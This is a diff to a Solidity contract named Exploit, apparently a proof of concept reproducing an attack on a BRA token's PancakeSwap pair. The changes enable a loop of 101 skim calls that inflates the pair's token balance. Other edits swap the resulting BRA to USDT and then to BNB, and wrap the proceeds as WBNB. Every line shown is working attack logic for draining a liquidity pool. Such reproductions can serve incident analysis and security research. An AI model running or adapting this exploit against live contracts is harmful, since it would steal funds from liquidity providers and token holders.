@@ -75,14 +75,14 @@ contract Exploit {
         console.log(" ~ sendAmount:", sendAmount);
         bra.transfer(BRA_USDT_Pair, sendAmount);
 
-        //for (uint256 i; i < 101; ++i) {
-        IPancakePair(BRA_USDT_Pair).skim(BRA_USDT_Pair);
-        //}
+        for (uint256 i; i < 101; ++i) {
+            IPancakePair(BRA_USDT_Pair).skim(BRA_USDT_Pair);
+        }
         uint256 pairBalancerAfter = bra.balanceOf(BRA_USDT_Pair);
         console.log(" ~ pairBalancerAfter:", pairBalancerAfter);
         // swap bra to usdt
         address[] memory inputSwapPath = new address[](2);
-        address[] memory outputSwapAmounts = new uint256[](2);
+        uint256[] memory outputSwapAmounts = new uint256[](2);
         inputSwapPath[0] = address(bra);
         inputSwapPath[1] = address(usdt);
         outputSwapAmounts = pancakeRouter.getAmountsOut(
@@ -92,6 +92,7 @@ contract Exploit {
         uint256 usdtAmount = outputSwapAmounts[1];
         IPancakePair(BRA_USDT_Pair).swap(0, usdtAmount, address(this), "");
         // usdt to wbnb
+        usdt.approve(address(pancakeRouter), type(uint256).max);
         inputSwapPath[0] = address(usdt);
         inputSwapPath[1] = address(wbnb);
         pancakeRouter.swapExactTokensForETH(
@@ -102,7 +103,13 @@ contract Exploit {
             block.timestamp
         );
         // BNB to WBNB
-        console2.log("amount: ", wbnb.balanceOf(address(this)));
+        console2.log(
+            "amount: ",
+            wbnb.balanceOf(address(this)),
+            address(this).balance
+        );
+        // wrap BNB to WBNB
+        wbnb.deposit{value: address(this).balance}();
     }
 }
 
